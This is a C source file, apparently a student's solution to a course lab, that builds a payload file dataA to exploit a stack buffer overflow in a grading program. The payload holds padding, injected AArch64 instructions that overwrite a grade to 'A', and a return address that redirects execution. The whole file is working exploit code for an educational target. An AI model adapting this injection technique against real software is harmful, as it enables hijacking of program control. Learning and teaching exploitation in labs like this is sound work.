/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Anish Kataria                                              */
/*--------------------------------------------------------------------*/
/*
  Produces a file called dataA with the student's name, padding, 
  and assembly instructions to overwrite the grade to 'A' by exploiting 
  a stack overflow.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* main function creates a buffer overflow file named dataA.
   it writes the student's name, padding bytes, machine instructions 
   to modify the grade to 'A', and the return address to overwrite 
   stored data in the stack. no input/output streams are used. */

int main(void)
{
    /* student's name */
    const char *name = "Anish";

    /* instruction-related variables */
    unsigned int mov_instr;
    unsigned int adr_instr;
    unsigned int strb_instr;
    unsigned int b_instr;

    /* target addresses */
    const unsigned long grade_addr = 0x420044;
    const unsigned long print_addr = 0x40089c;
    const unsigned long ret_addr = 0x420078;
    unsigned long curr_addr = 0x420058;

    /* open dataA file for writing */
    FILE *file = fopen("dataA", "w");
    if (!file) return 1;

    /* write name and null terminator */
    fwrite(name, 1, 6, file); /* 'Anish\0' */
    curr_addr += 6;

    /* add padding to align the buffer overflow */
    while (curr_addr % 4 != 0) {
        fputc(0, file);
        curr_addr++;
    }

    /* calculate remaining padding to 48 bytes */
    int padding_bytes = 48 - 17; /* 17 = instructions + return address */
    for (int i = 0; i < padding_bytes; i++) {
        fputc(0, file);
    }

    /* write the assembly instructions */
    mov_instr = MiniAssembler_mov(0, 'A'); /* move 'A' into w0 */
    fwrite(&mov_instr, sizeof(unsigned int), 1, file);

    adr_instr = MiniAssembler_adr(1, grade_addr, curr_addr + 4); /* adr grade addr into x1 */
    fwrite(&adr_instr, sizeof(unsigned int), 1, file);

    strb_instr = MiniAssembler_strb(0, 1); /* store 'A' from w0 into grade */
    fwrite(&strb_instr, sizeof(unsigned int), 1, file);

    b_instr = MiniAssembler_b(print_addr, curr_addr + 12); /* branch to printf */
    fwrite(&b_instr, sizeof(unsigned int), 1, file);

    /* write the return address to finalize the buffer overflow */
    fwrite(&ret_addr, sizeof(unsigned long), 1, file);

    /* close the file and return success */
    fclose(file);
    return 0;
}